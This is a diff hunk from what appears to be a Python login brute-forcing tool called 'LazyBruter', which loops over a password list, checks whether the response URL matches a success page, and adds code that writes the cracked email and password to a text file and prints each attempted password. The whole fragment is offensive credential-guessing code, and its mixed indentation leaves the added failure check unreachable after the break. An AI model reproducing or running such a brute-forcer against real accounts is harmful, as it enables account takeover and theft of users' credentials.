@@ -26,4 +26,15 @@ for password in passwfile:
 	
     if response.geturl() == success_url:
 	    print ("[+]Password Found: " + password.strip())
+    input("Press Enter to save the result in .txt")
+    file = open("password cracked.txt","w")
+    file.write("Email: ")
+    file.write(user)
+    file.write("    Password: ")
+    file.write(password)
+    file.close()
+    input("Password saved! Search for <password cracked.txt> in LazyBruter Folder")
     break
+		
+    if response.geturl() != success_url:
+        print ("[!]Trying password:" + password.strip())
